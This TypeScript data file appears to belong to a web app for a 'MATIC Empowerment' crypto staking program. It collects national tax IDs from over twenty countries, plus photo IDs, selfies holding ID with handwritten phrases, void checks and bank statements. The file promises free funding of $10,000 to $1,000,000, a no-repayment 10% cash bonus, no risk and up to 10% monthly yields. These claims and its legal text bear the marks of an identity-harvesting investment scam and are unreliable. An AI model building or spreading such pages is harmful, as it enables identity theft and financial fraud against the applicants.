/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { CountryConfig, HowItWorksStep, BenefitItem, FAQItem } from './types';

export const COUNTRIES: CountryConfig[] = [
  {
    code: 'US',
    name: 'US',
    fullName: 'United States',
    flag: '🇺🇸',
    taxIdLabel: 'Social Security Number (SSN)',
    taxIdPlaceholder: '***-**-****',
    extraTaxNotes: 'Requires standard W-9 validation for card activation. Post-funding, a Form 1099-NEC will be issued for the 10% kept portion.',
    documents: [
      {
        id: 'photo_id',
        name: 'Government-issued Photo ID',
        description: 'U.S. Passport, Driver\'s License, or State ID (front & back).'
      },
      {
        id: 'proof_address',
        name: 'Proof of Residency & Billing',
        description: 'Utility bill, bank statement, or insurance policy dated within 60 days.'
      },
      {
        id: 'selfie_id',
        name: 'Selfie with ID Verification',
        description: 'A clear photo of yourself holding your selected Photo ID alongside a handwritten note "MATIC Program 2026".'
      },
      {
        id: 'direct_deposit',
        name: 'PayCard and Address Setup',
        description: 'Void check or signed bank direct deposit statement to verify home mailing address.'
      }
    ]
  },
  {
    code: 'GB',
    name: 'GB',
    fullName: 'United Kingdom',
    flag: '🇬🇧',
    taxIdLabel: 'National Insurance Number (NINO)',
    taxIdPlaceholder: 'QQ 12 34 56 C',
    extraTaxNotes: 'Requires standard UK HM Revenue & Customs disclosure agreement for direct PayCard allocation setup.',
    documents: [
      {
        id: 'photo_id',
        name: 'Government-issued Photo ID',
        description: 'UK Passport, Biometric Residence Permit (BRP), or Photocard Driving Licence.'
      },
      {
        id: 'proof_address',
        name: 'Proof of Residency',
        description: 'Council tax statement, energy bill, or UK bank statement from last 3 months.'
      },
      {
        id: 'selfie_id',
        name: 'Selfie with ID Verification',
        description: 'Hold photo ID alongside handwritten declaration stating "MATIC Program UK 2026" with today\'s date.'
      },
      {
        id: 'direct_deposit',
        name: 'Digital PayCard Setup Authorization',
        description: 'Utility bill or bank statement showing sort code to confirm account verification for card setup.'
      }
    ]
  },
  {
    code: 'CA',
    name: 'CA',
    fullName: 'Canada',
    flag: '🇨🇦',
    taxIdLabel: 'Social Insurance Number (SIN)',
    taxIdPlaceholder: '###-###-###',
    extraTaxNotes: 'Requires provincial tax disclosures of staking interest and dividend allocation filings for card disbursement.',
    documents: [
      {
        id: 'photo_id',
        name: 'Government-issued Photo ID',
        description: 'Canadian Passport, Provincial Driver\'s License, or Age of Majority card.'
      },
      {
        id: 'proof_address',
        name: 'Proof of Residency',
        description: 'Utility bill, municipal notice, or CRA tax notice within the last 60 days.'
      },
      {
        id: 'selfie_id',
        name: 'Selfie Verification',
        description: 'A clear photo of yourself holding your Canadian ID with a handwritten note "MATIC Program Canada 2026".'
      },
      {
        id: 'direct_deposit',
        name: 'PayCard Mailing Validation',
        description: 'Standard Canadian address certificate showing legal matching address.'
      }
    ]
  },
  {
    code: 'DE',
    name: 'DE',
    fullName: 'Germany',
    flag: '🇩🇪',
    taxIdLabel: 'Steueridentifikationsnummer (Steuer-ID)',
    taxIdPlaceholder: '## ### ### ###',
    extraTaxNotes: 'Private staking income is subjected to German tax declarations (Einkommensteuererklärung) after a holding period under €600 threshold.',
    documents: [
      {
        id: 'photo_id',
        name: 'EU Personalausweis / Reisepass',
        description: 'German national identity card or international passport (both sides).'
      },
      {
        id: 'proof_address',
        name: 'Meldebescheinigung / Utility Bill',
        description: 'Official German address registration document or municipal utility connection statement.'
      },
      {
        id: 'selfie_id',
        name: 'Selfie mit Ausweis',
        description: 'Hold Personalausweis close to face with handwritten note specifying "Polygon MATIC 2026 Germany" visible.'
      },
      {
        id: 'direct_deposit',
        name: 'SEPA PayCard Activation Mandate',
        description: 'Completed SEPA authorization for loading Digital Payroll Card balance securely.'
      }
    ]
  },
  {
    code: 'AU',
    name: 'AU',
    fullName: 'Australia',
    flag: '🇦🇺',
    taxIdLabel: 'Tax File Number (TFN)',
    taxIdPlaceholder: '#########',
    extraTaxNotes: 'Staking gains and interest bonuses must be declared under Australian Taxation Office (ATO) income reporting indices.',
    documents: [
      {
        id: 'photo_id',
        name: 'Australian Photo ID',
        description: 'Australian Passport, Driver\'s Licence, or Proof of Age photo card.'
      },
      {
        id: 'proof_address',
        name: 'Proof of Address',
        description: 'Electric/water utility invoice or bank statement showing registered Australian residential address.'
      },
      {
        id: 'selfie_id',
        name: 'Selfie with Passport/Driver Licence',
        description: 'Hold Australian ID with handwritten statement saying "MATIC Program Australia 2026" with signature.'
      },
      {
        id: 'direct_deposit',
        name: 'E-PayCard Residence Validation',
        description: 'Official residency summary showing active address for PayCard postal routing.'
      }
    ]
  },
  {
    code: 'NL',
    name: 'NL',
    fullName: 'Netherlands',
    flag: '🇳🇱',
    taxIdLabel: 'Burgerservicenummer (BSN)',
    taxIdPlaceholder: '#########',
    extraTaxNotes: 'Subject to Box 3 asset taxation guidelines in the Netherlands. Requires proof of residential registration.',
    documents: [
      { id: 'photo_id', name: 'Dutch ID Card or Passport', description: 'National identity card or Dutch passport.' },
      { id: 'proof_address', name: 'Address Statement', description: 'Bank statement or municipal extract (BRP) within 60 days.' },
      { id: 'selfie_id', name: 'Selfie Verification', description: 'Selfie holding Dutch ID with written note "MATIC NL 2026".' },
      { id: 'direct_deposit', name: 'PayCard Mailing Statement', description: 'Residential invoice verifying card delivery address.' }
    ]
  },
  {
    code: 'CN',
    name: 'CN',
    fullName: 'China',
    flag: '🇨🇳',
    taxIdLabel: 'Resident Identity Number (身份证号)',
    taxIdPlaceholder: '##################',
    extraTaxNotes: 'Requires strict identity matching to facilitate traditional fiat-backed Digital Payroll Card activation and support.',
    documents: [
      { id: 'photo_id', name: 'National Resident Identity Card', description: 'Front and back of Chinese Resident Identity Card.' },
      { id: 'proof_address', name: 'Mailing Address Bill', description: 'Utility invoice or residence registry statement (户口簿).' },
      { id: 'selfie_id', name: 'Selfie with Identity Card', description: 'Hold Resident ID next to face with high resolution.' },
      { id: 'direct_deposit', name: 'Disbursement Address Certificate', description: 'Chinese residential certificate for priority PayCard shipment.' }
    ]
  },
  {
    code: 'FR',
    name: 'FR',
    fullName: 'France',
    flag: '🇫🇷',
    taxIdLabel: 'Numéro d\'Inscription au Répertoire (NIR)',
    taxIdPlaceholder: '###############',
    extraTaxNotes: 'Subject to French flat tax (Prélèvement Forfaitaire Unique). Validated for European secure card routing.',
    documents: [
      { id: 'photo_id', name: 'French Carte d\'identité or Passport', description: 'National ID card or passport.' },
      { id: 'proof_address', name: 'Justificatif de domicile', description: 'EDF statement, gas bill, or water invoice from last 3 months.' },
      { id: 'selfie_id', name: 'Selfie with French ID', description: 'Selfie holding your French identity card with written note "MATIC FR 2026".' },
      { id: 'direct_deposit', name: 'Disbursement Access Form', description: 'Residential verification for French PayCard allocation.' }
    ]
  },
  {
    code: 'ES',
    name: 'ES',
    fullName: 'Spain',
    flag: '🇪🇸',
    taxIdLabel: 'Documento Nacional de Identidad (DNI/NIE)',
    taxIdPlaceholder: '########?',
    extraTaxNotes: 'スペインの暗号通貨税制に準拠. Required for issuing international compliant Payroll Cards.',
    documents: [
      { id: 'photo_id', name: 'Spanish DNI or Passport', description: 'National ID or foreign resident certificate (NIE).' },
      { id: 'proof_address', name: 'Empadronamiento or Utility Bill', description: 'Municipal registration slip or utility bill statement.' },
      { id: 'selfie_id', name: 'Selfie containing DNI/NIE', description: 'Check that text on the Spanish ID card is readable alongside face.' },
      { id: 'direct_deposit', name: 'Digital PayCard Mandate', description: 'Signed Spanish residential declaration for digital activator setup.' }
    ]
  },
  {
    code: 'IT',
    name: 'IT',
    fullName: 'Italy',
    flag: '🇮🇹',
    taxIdLabel: 'Codice Fiscale',
    taxIdPlaceholder: '????????????????',
    extraTaxNotes: 'Compliance with Italian Agenzia delle Entrate cryptocurrency and staking legislation.',
    documents: [
      { id: 'photo_id', name: 'Italian Carta d\'Identità or Passport', description: 'National identity card or standard Italian passport.' },
      { id: 'proof_address', name: 'Certificate of Residence', description: 'Recent gas, power, or phone statement highlighting matching name.' },
      { id: 'selfie_id', name: 'Selfie holding Codice Fiscale card', description: 'Hold Codice Fiscale card paired with standard photo ID.' },
      { id: 'direct_deposit', name: 'PayCard Shipping Clearance', description: 'Italy localized address verification for secure transit.' }
    ]
  },
  {
    code: 'SE',
    name: 'SE',
    fullName: 'Sweden',
    flag: '🇸🇪',
    taxIdLabel: 'Personnummer',
    taxIdPlaceholder: 'YYMMDD-XXXX',
    extraTaxNotes: 'Subject to Skatteverket tax schedules for cryptocurrency staker capital dividends.',
    documents: [
      { id: 'photo_id', name: 'Swedish National ID or Passport', description: 'Identifikationskort or passport.' },
      { id: 'proof_address', name: 'Address Extract (Personbevis)', description: 'Recent registry record issued by Skatteverket.' },
      { id: 'selfie_id', name: 'Selfie Verified with ID Card', description: 'Hold your Swedish ID card with written note "MATIC SWE 2026".' },
      { id: 'direct_deposit', name: 'Payroll Card Statement', description: 'Address verification for priority Nordic PayCard delivery.' }
    ]
  },
  {
    code: 'NO',
    name: 'NO',
    fullName: 'Norway',
    flag: '🇳🇴',
    taxIdLabel: 'Fødselsnummer',
    taxIdPlaceholder: '###########',
    extraTaxNotes: 'Crypto stakes yields declared as wealth/income in Norway. Processed via premium partner banks.',
    documents: [
      { id: 'photo_id', name: 'Norwegian Passport or ID Card', description: 'National ID or Norwegian passport.' },
      { id: 'proof_address', name: 'Bostedsattest or Utility Statement', description: 'Official Norwegian address certificate or municipal bill.' },
      { id: 'selfie_id', name: 'Norwegian Selfie Match', description: 'Hold ID and written phrase "MATIC NORWAY 2026" clearly.' },
      { id: 'direct_deposit', name: 'PayCard Postal Authorization', description: 'Norwegian address summary for secure card courier.' }
    ]
  },
  {
    code: 'CH',
    name: 'CH',
    fullName: 'Switzerland',
    flag: '🇨🇭',
    taxIdLabel: 'AHV-Nummer (SSN Equivalent)',
    taxIdPlaceholder: '756.####.####.##',
    extraTaxNotes: 'Compliance with Swiss Federal Tax Administration (ESTV) wealth and capital gain guidelines.',
    documents: [
      { id: 'photo_id', name: 'Swiss Passport or ID Card', description: 'Swiss passport or national Identitätskarte.' },
      { id: 'proof_address', name: 'Wohnsitzbestätigung or Utility Bill', description: 'Swiss residency confirmation or recent utilities invoice.' },
      { id: 'selfie_id', name: 'Selfie with Swiss ID', description: 'Hold identity proof with written confirmation "MATIC SWISS 2026".' },
      { id: 'direct_deposit', name: 'Digital PayCard Mandate', description: 'Signed Swiss address record for secure Financial Access Card routing.' }
    ]
  },
  {
    code: 'IE',
    name: 'IE',
    fullName: 'Ireland',
    flag: '🇮🇪',
    taxIdLabel: 'PPS Number (PPSN)',
    taxIdPlaceholder: '#######??',
    extraTaxNotes: 'Subject to Irish Revenue Commissioners income listings. Supports standard European Union PayCard distribution.',
    documents: [
      { id: 'photo_id', name: 'Irish Passport or Driver\'s License', description: 'Irish identity card, passport, or driver card.' },
      { id: 'proof_address', name: 'Utility invoice / Bank Document', description: 'Recent Irish utility connection receipt with your full name.' },
      { id: 'selfie_id', name: 'Selfie with Irish ID', description: 'Hold ID showing written phrase "MATIC IRELAND 2026".' },
      { id: 'direct_deposit', name: 'PayCard Registry Form', description: 'Confirm Irish delivery postal codes.' }
    ]
  },
  {
    code: 'BE',
    name: 'BE',
    fullName: 'Belgium',
    flag: '🇧🇪',
    taxIdLabel: 'National Register Number (Rijksregisternummer)',
    taxIdPlaceholder: '###########',
    extraTaxNotes: 'Subject to Belgian SPF Finances filings. Optimized for physical and digital PayCard setups.',
    documents: [
      { id: 'photo_id', name: 'Belgian ID Card or Passport', description: 'Belgische identiteitskaart or passport.' },
      { id: 'proof_address', name: 'Address Statement (Woonplaats)', description: 'Municipal address extract or utility invoice.' },
      { id: 'selfie_id', name: 'Selfie matching Belgian ID', description: 'Clear facial portrait with standard ID.' },
      { id: 'direct_deposit', name: 'Financial Card Dispatch Proof', description: 'Verifies Belgian address for prioritized card mailing.' }
    ]
  },
  {
    code: 'AT',
    name: 'AT',
    fullName: 'Austria',
    flag: '🇦🇹',
    taxIdLabel: 'Sozialversicherungsnummer (SVnr)',
    taxIdPlaceholder: '##########',
    extraTaxNotes: 'Austrian cryptocurrency taxation guidelines are strictly followed. Core stakes are converted for delegation.',
    documents: [
      { id: 'photo_id', name: 'Austrian Personalausweis or Passport', description: 'National identity registry document.' },
      { id: 'proof_address', name: 'Meldezettel', description: 'Official residency residence announcement sheet (Meldezettel) within 90 days.' },
      { id: 'selfie_id', name: 'Selfie holding Meldezettel', description: 'Hold your official Meldezettel and ID card clearly.' },
      { id: 'direct_deposit', name: 'Digital Payroll Card Setup', description: 'Secure address verification for Austrian card ledger activate.' }
    ]
  },
  {
    code: 'SG',
    name: 'SG',
    fullName: 'Singapore',
    flag: '🇸🇬',
    taxIdLabel: 'NRIC / FIN Number',
    taxIdPlaceholder: '?#######?',
    extraTaxNotes: 'Tax exemption on staking profits is applied for qualifying participants under IRAS guidelines. Priority PayCard setup.',
    documents: [
      { id: 'photo_id', name: 'Singapore NRIC or Passport', description: 'National Registration Identity Card or Singapore passport.' },
      { id: 'proof_address', name: 'Proof of residential address', description: 'Local telecom bill, SP Group utilities invoice, or bank letter.' },
      { id: 'selfie_id', name: 'Selfie containing NRIC', description: 'Hold Singapore NRIC with handwritten phrase "MATIC SINGAPORE 2026".' },
      { id: 'direct_deposit', name: 'PayCard Dispatch Clearance', description: 'Mailing code detail to confirm high speed courier shipping.' }
    ]
  },
  {
    code: 'JP',
    name: 'JP',
    fullName: 'Japan',
    flag: '🇯🇵',
    taxIdLabel: 'My Number (マイナンバー)',
    taxIdPlaceholder: '############',
    extraTaxNotes: 'Staking profits categorized as Miscellaneous Income (雑所得) under Japanese National Tax Agency.',
    documents: [
      { id: 'photo_id', name: 'Japan Residence Card / Driver Card', description: 'My Number Card, Driver\'s License, or Zairyu Card (both sides).' },
      { id: 'proof_address', name: 'Certificate of Residence (住民票)', description: 'Utility invoice or Juminhyo extract from municipal office.' },
      { id: 'selfie_id', name: 'Selfie with My Number Card', description: 'Clear self-portrait holding identity card with hand note "MATIC JAPAN 2026".' },
      { id: 'direct_deposit', name: 'Postal PayCard Release Consent', description: 'Consent agreement confirming shipping receipt of Financial Access Card.' }
    ]
  },
  {
    code: 'KR',
    name: 'KR',
    fullName: 'South Korea',
    flag: '🇰🇷',
    taxIdLabel: 'Resident Registration Number (주민등록번호)',
    taxIdPlaceholder: '######-#######',
    extraTaxNotes: 'Requires strict Korean National Tax Service identity pairing for Digital Payroll Card activation.',
    documents: [
      { id: 'photo_id', name: 'South Korea Resident ID or Passport', description: 'Korean Resident Card or official passport.' },
      { id: 'proof_address', name: 'Resident Registration Extract (주민등록초본)', description: 'Government address copy showing legal Korean domicile.' },
      { id: 'selfie_id', name: 'Selfie matching Korean ID', description: 'Hold Resident card with written text "MATIC KOREA 2026".' },
      { id: 'direct_deposit', name: 'Korean PayCard Dispatch Proof', description: 'Authorized verification for Korean domestic mail routing.' }
    ]
  },
  {
    code: 'AE',
    name: 'AE',
    fullName: 'United Arab Emirates',
    flag: '🇦🇪',
    taxIdLabel: 'Emirates ID Number',
    taxIdPlaceholder: '784-####-#######-#',
    extraTaxNotes: 'Sovereign zero-tax region compliance. Facilitates high-trust international Payroll Card activation.',
    documents: [
      { id: 'photo_id', name: 'UAE Emirates ID or Passport', description: 'Emirates Identity Card (front & back) or passport.' },
      { id: 'proof_address', name: 'DEWA Bill or Ejari Contract', description: 'Dubai Electricity & Water Authority statement or real estate contract.' },
      { id: 'selfie_id', name: 'Selfie with Emirates ID', description: 'Hold Emirates ID with written statement "MATIC UAE 2026".' },
      { id: 'direct_deposit', name: 'PayCard Delivery Clearance', description: 'Address index for priority courier transit in Dubai/Abu Dhabi.' }
    ]
  },
  {
    code: 'NZ',
    name: 'NZ',
    fullName: 'New Zealand',
    flag: '🇳🇿',
    taxIdLabel: 'IRD Number',
    taxIdPlaceholder: '#########',
    extraTaxNotes: 'Subject to New Zealand Inland Revenue Department taxation rules. Sourced via authorized node partners.',
    documents: [
      { id: 'photo_id', name: 'NZ Passport or Driver Licence', description: 'New Zealand passport or photocard driver licence.' },
      { id: 'proof_address', name: 'Proof of NZ Address', description: 'Utility statement, council tax registration, or bank statement.' },
      { id: 'selfie_id', name: 'NZ Selfie Matching', description: 'Hold NZ identification with handwritten memo "MATIC NZ 2026".' },
      { id: 'direct_deposit', name: 'PayCard Dispatch Summary', description: 'Address confirmation for secure card transit.' }
    ]
  },
  {
    code: 'OT',
    name: 'OT',
    fullName: 'Other Eligible Regions',
    flag: '🌐',
    taxIdLabel: 'National Tax Identification Number',
    taxIdPlaceholder: 'Tax Identification Code',
    extraTaxNotes: 'Available to compliant regions honoring OECD anti-fraud models and international staker protocols.',
    documents: [
      { id: 'photo_id', name: 'International Photo ID', description: 'Valid national passport or national resident ID card.' },
      { id: 'proof_address', name: 'Residency Verification Statement', description: 'Residential utility invoice or bank certification under 90 days.' },
      { id: 'selfie_id', name: 'Selfic Verification Note', description: 'Hold ID showing written phrase "MATIC GLOBAL 2026".' },
      { id: 'direct_deposit', name: 'Global Priority Card Delivery', description: 'Confirm exact shipping coordinates for global PayCard routing.' }
    ]
  }
];

export const HOW_IT_WORKS_STEPS: HowItWorksStep[] = [
  {
    number: 1,
    title: 'Receive Capital Funding',
    description: 'Once you successfully pass our compliance check, you become eligible to receive a minimum program fund of $10,000 up to $1,000,000.',
    bulletPoints: [
      'Funds are sourced through direct Polygon Validator allocation portfolios.',
      'Upon final approval, 10% cash bonus of the complete funding value is disbursed directly to you via Payroll Card or Check.',
      'Keep your 10% immediately with no repayment obligation.'
    ]
  },
  {
    number: 2,
    title: 'Acquire & Delegate MATIC (90%)',
    description: 'The remaining 90% goes strictly towards securing the network by acquiring MATIC tokens and delegating them to our associated high-tier validator nodes.',
    bulletPoints: [
      'Our team initiates the transaction under a joint legal agreement.',
      'Tokens are secured in professional non-custodial smart contracts.',
      'Supports the Polygon core consensus layer (proof-of-stake verification).'
    ]
  },
  {
    number: 3,
    title: 'Earn Monthly Rewards',
    description: 'Delegation produces compounding staking dividends of up to 10% monthly based on the size of your delegated base.',
    bulletPoints: [
      'Staking dividends can be claimed monthly directly to your external wallet or banking portal.',
      'Claims and transparency records are visible inside your customized virtual staker dashboard.',
      'Stable yield backed by transaction fee allocations and block incentives in the Polygon ecosystem.'
    ]
  },
  {
    number: 4,
    title: 'Long-term Program Stake',
    description: 'All delegated MATIC remains in lockup mode protecting network stability through current market cycles.',
    bulletPoints: [
      'Minimum lockup duration aligns with Polygon network growth contracts.',
      'Protects against premature asset dumps to guarantee price stability.',
      'Orderly release protocol manages returning core capitals seamlessly during peak liquidity.'
    ]
  },
  {
    number: 5,
    title: 'Legal & Escrow Security',
    description: 'We safeguard all participants under official government-vetted KYC guidelines and binding judicial agreements.',
    bulletPoints: [
      'Regulated standard contracts secure rights for both parties.',
      'Complies with top-tier international standard KYC, identity check and active fraud barriers.',
      'Protected with industrial sandbox encryptions and digital escrow keys.'
    ]
  }
];

export const BENEFITS: BenefitItem[] = [
  {
    title: 'No Personal Capital Risk',
    description: 'Participate without risk. Standard capital funding is provided in full by institutional partners and validators.',
    badge: 'Primary Benefit'
  },
  {
    title: 'Keep 10% Immediately',
    description: 'Receive 10% of total funding immediately upon application approval (e.g. keep $1,000 cash from a standard $10,000 allocation).',
    badge: 'Direct Bonus'
  },
  {
    title: 'up to 10% Monthly Rewards',
    description: 'Enjoy attractive yield structures from the staked portion (90%) monthly, offering high passive cashflows in stable tokens.',
    badge: 'Passive Income'
  },
  {
    title: 'Strengthen Polygon Network',
    description: 'Play a direct, historical role in delegation securing transactions for Polygon POS chains, increasing validator capacity and liquidity.',
    badge: 'Eco Contribution'
  },
  {
    title: 'Secure Legal Protocols',
    description: 'Participate with peace of mind. All agreements are signed on-chain using certified hashes and are fully legally binding under international jurisdictions.',
    badge: 'Compliance'
  },
  {
    title: 'Dedicated Advisor Help',
    description: 'Every participant receives guidance from a dedicated validator relationship manager to assist with any payout inquiries.',
    badge: 'Active Support'
  }
];

export const FAQS: FAQItem[] = [
  {
    question: 'How works the 10% / 90% split of funds?',
    answer: 'Once approved for $10,000 (minimum), $1,000 (10%) is sent directly to your bank account or via certified cheque. The remaining $9,000 (90%) is used to purchase MATIC tokens internally on your behalf, which is then delegated into our premium validator nodes to secure the network and generate staking dividends.',
    category: 'Staking Structure'
  },
  {
    question: 'Is there any repayment required or personal debt?',
    answer: 'No. This is a capital empowerment program sponsored directly by leading web3 funds and MATIC validator nodes. There are no debt obligations, loans, or interest payments. The capital is provided specifically for delegation.',
    category: 'Financials'
  },
  {
    question: 'What is the standard processing time for KYC verification?',
    answer: 'Our standard compliance review takes between 24 and 72 hours (max 3 days). You will receive an immediate automated email showing your step statuses. You can also view active diagnostic checklist points inside our LIVE application tracker page.',
    category: 'Verification'
  },
  {
    question: 'Which countries are supported in this node?',
    answer: 'We currently support the United States, Canada, the United Kingdom, Germany, and Australia. We are expanding to other jurisdictions in the coming quarters. Choose your specific region to generate customized forms.',
    category: 'General'
  },
  {
    question: 'How are monthly rewards calculated and paid?',
    answer: 'Staking rewards yield up to 10% monthly on the 90% delegated portion. Payments are recalculated at the end of every epoch cycle and sent in monthly batches straight to your linked bank account or electronic wallet.',
    category: 'Staking Structure'
  },
  {
    question: 'Can I release the staked MATIC early?',
    answer: 'No. The 90% delegated portion is locked in a secure smart contract until the next major market liquidity cycle completes to ensure network price stability. The lockup period is legally detailed in the scroll-locked terms document.',
    category: 'General'
  }
];

export const LEGAL_TERMS_TEXT = `
========================================================================
             MATIC EMPOWERMENT STAKING PARTNERSHIP AGREEMENT
========================================================================
Document ID: MEP-2026-LEGALTXN-v4.9
Registry Jurisdiction: Sovereign Smart Escrow Protocol 
Sponsor Ref: Polygon Ecosystem Validator Node Consolidated Consortium

IMPORTANT NOTE: YOU MUST CAREFULLY READ AND REVIEW THIS ENTIRE DELEGATED 
STAKING AGREEMENT TO THE VERY BOTTOM IN ORDER TO UNLOCK THE SIGNATURE INTERFACE.

------------------------------------------------------------------------
ARTICLE 1: OBJECTIVE AND RECIPIENT ALLOCATION
------------------------------------------------------------------------
1.1 Under the terms of the MATIC Empowerment Initiative, the sponsoring entity 
(herein "The Sponsor" or "Validator Console") agrees to allocate direct, dedicated 
capital funding starting at a minimum baseline of Ten Thousand Dollars ($10,000 USD 
equivalent) up to One Million Dollars ($1,000,000 USD) to the validated participant 
(herein "The Recipient").

1.2 Capital disbursement is strictly segmented in the following structured proportions:
  - TEN PERCENT (10.00%): Allocated as an immediate liquid capital cash incentive. 
    The Recipient is fully entitled to keep this 10% allotment immediately upon final 
    compliance approval. This cash is distributed via institutional certified cheque, 
    SEPA wire transfer, or direct deposit without any loan payback liability.
  - NINETY PERCENT (90.00%): Allocated for Polygon Network security. This portion 
    is converted immediately to Polygon MATIC tokens at the current standardized cycle rate 
    of $0.50 USD per MATIC token. This capital must remain strictly designated, held, 
    and delegated securely on our network validator nodes to ensure cryptographic consensus layers.

------------------------------------------------------------------------
ARTICLE 2: CO-SIGNING, ESCROW AND SMART CONTRACT MECHANICS
------------------------------------------------------------------------
2.1 All delegated MATIC tokens purchase elements (the 90% core) are secured through 
non-custodial multi-signature institutional cold vaults mapped to Polygon network validator balances. 
The Recipient is declared the named delegator and holds yield claiming benefits.

2.2 The Recipient is strictly forbidden from attempting to withdraw, transfer, short-sell, 
or trade the base 90% MATIC tokens core prior to the completion of the designated lockup period. 
Any attempt to manipulate the underlying smart contract will result in an automated 
escrow termination.

------------------------------------------------------------------------
ARTICLE 3: STAKING YIELDS & REWARD PAYOUT STRUCTURE
------------------------------------------------------------------------
3.1 Staking yield calculations are pegged up to a maximum rate of 10.00% monthly. 
Yield percentages fluctuate dynamically based on the current global Polygon staking ratio 
and consensus protocol block heights.

3.2 Recipient rewards are distributed in monthly cycles. The Sponsor agrees to transfer rewards in 
stabilized cryptocurrency (USDT / USDC) or local fiat currency to the validated bank account 
on the 1st standard calendar day of each cycle.

------------------------------------------------------------------------
ARTICLE 4: TAX DISCLOSURES & COMPLIANCE (KYC / AML)
------------------------------------------------------------------------
4.1 The Recipient acknowledges that the 10% take-home cash bonus is fully taxable under 
local state jurisdictions. For United States citizens, a standard Form W-9 is required 
prior to payout, and a Form 1099-NEC will be filed. For non-US residents (UK, CA, DE, AU), 
recipients are fully responsible to report values under applicable income and capital gain protocols.

4.2 The Applicant must submit genuine, high-resolution documentation for ID verification. 
Proof of address must correspond precisely with the location of the selected Regional 
Program Node. Attempting to submit fraudulent documents, mismatched tax identification numbers, 
or blurred selfies will invoke immediate compliance rejections.

------------------------------------------------------------------------
ARTICLE 5: TERM, REMOVAL AND ORDERLY EXIT
------------------------------------------------------------------------
5.1 This Agreement remains in complete enforceability through the duration of the current 
multi-year market transition cycle. Average expected unlock and orderly unstaking is 
tentatively scheduled at the peak cycle.

5.2 In case of emergency Polygon validator consensus upgrade, key variables may be adjusted 
to guarantee asset safekeeping and continuous validator integrity.

------------------------------------------------------------------------
ARTICLE 6: ACCEPTANCE AND SECURITY CERTIFICATION
------------------------------------------------------------------------
By executing a cryptographic digital signature at the foot of this interactive agreement, 
the Applicant certifies to hold complete understanding of the 10/90 stake structure and 
covenants.

This digital sign-off will generate an immutable, verified SHA-256 integrity token 
associated with the applicant's entered tax ID, IP registry packet, and personal names.

*** END OF LEGAL DOCUMENT ***
`;
